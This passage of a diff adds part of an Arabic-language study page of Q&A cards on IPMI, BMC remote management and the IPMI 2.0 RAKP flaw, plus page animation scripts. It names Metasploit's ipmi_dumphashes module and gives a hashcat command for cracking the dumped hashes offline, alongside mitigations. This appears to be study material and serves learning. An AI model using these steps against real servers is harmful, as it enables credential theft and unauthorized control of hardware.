+      <div class="qa-a">لأن BMC متصل مباشرة بالـ Motherboard ويتحكم في الـ hardware كاملاً. تقدر تراقب، تشغّل، تطفي، أو تعيد تثبيت الـ OS — بدون ما تكون فيزيائياً أمام الجهاز.</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">إيش الـ 3 حالات اللي يستخدم فيها الـ sysadmin IPMI؟</div>
+      <div class="qa-a">هاي حالات الصيانة — كأنه موجود فيزيائياً أمام السيرفر: 1) قبل ما يشتغل الـ OS (تعديل BIOS). 2) لما السيرفر مطفي (يشغّله عن بعد). 3) بعد ما السيرفر انهار (يتصل فيه ويصلح المشكلة).</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">💀 RAKP Vulnerability</div>
+    <div class="qa">
+      <div class="qa-q">إيش الـ Salt وليش يستخدم؟</div>
+      <div class="qa-a">Salt = كلمة عشوائية تُضاف للباسورد قبل التشفير. بدون salt: نفس الباسورد = نفس الـ hash دايماً = سهل يكشفه المهاجم. مع salt: نفس الباسورد + salt مختلف = hash مختلف = أصعب للكسر.</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">إيش مشكلة RAKP بالضبط؟</div>
+      <div class="qa-a">في IPMI 2.0، لما تقول للسيرفر "أنا ADMIN" — يرسل لك hash الباسورد فوراً قبل ما يتحقق من هويتك! مثل حارس يقول لك "باسورد محمد هو XYZ" قبل ما يسألك أي سؤال. أي شخص على الشبكة يقدر يطلب الـ hash ويكسره offline.</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">ليش ما في fix لـ RAKP؟</div>
+      <div class="qa-a">لأن الثغرة في تصميم بروتوكول IPMI 2.0 نفسه — مش في implementation معين. لو أصلحوها = كسروا الـ spec كاملاً وكل الأجهزة تحتاج تتغير. الحل الوحيد: باسوردات قوية جداً + network segmentation.</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">إيش OUTPUT_HASHCAT_FILE في Metasploit؟</div>
+      <div class="qa-a">option في ipmi_dumphashes يحدد مكان حفظ الـ hashes بالـ format الصح لـ hashcat تلقائياً. بدلاً من تنسخ الـ hash يدوياً، الملف يكون جاهز مباشرة تشغّل عليه: hashcat -m 7300 ipmi_hashes.txt rockyou.txt</div>
+    </div>
+  </div>
+
+</div>
+
+</div>
+
+<script>(function(){var c=document.getElementById('glass-particles');if(!c)return;var x=c.getContext('2d'),W,H,pts=[];function resize(){W=c.width=window.innerWidth;H=c.height=window.innerHeight}function spawn(){pts=[];var n=Math.max(80,Math.min(Math.round(W*H/7000),220));for(var i=0;i<n;i++)pts.push({x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.8+0.4,vy:-(Math.random()*0.45+0.15),vx:(Math.random()-0.5)*0.18,a:Math.random()*0.55+0.15})}function draw(){x.clearRect(0,0,W,H);pts.forEach(function(p){x.beginPath();x.arc(p.x,p.y,p.r,0,Math.PI*2);x.fillStyle='rgba(255,255,255,'+p.a+')';x.fill();p.y+=p.vy;p.x+=p.vx;if(p.y<-8){p.y=H+4;p.x=Math.random()*W}if(p.x<0)p.x=W;if(p.x>W)p.x=0});requestAnimationFrame(draw)}resize();spawn();draw();window.addEventListener('resize',function(){resize();spawn()})})();</script>
+
+<script>
+function showPanel(name,btn){
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('panel-'+name).classList.add('active');
+  btn.classList.add('active');
+}
+function showTool(name,btn){
+  document.querySelectorAll('.tool-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tool-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tool-'+name).classList.add('active');
+  btn.classList.add('active');
+}
+</script>
+</body>
+</html>
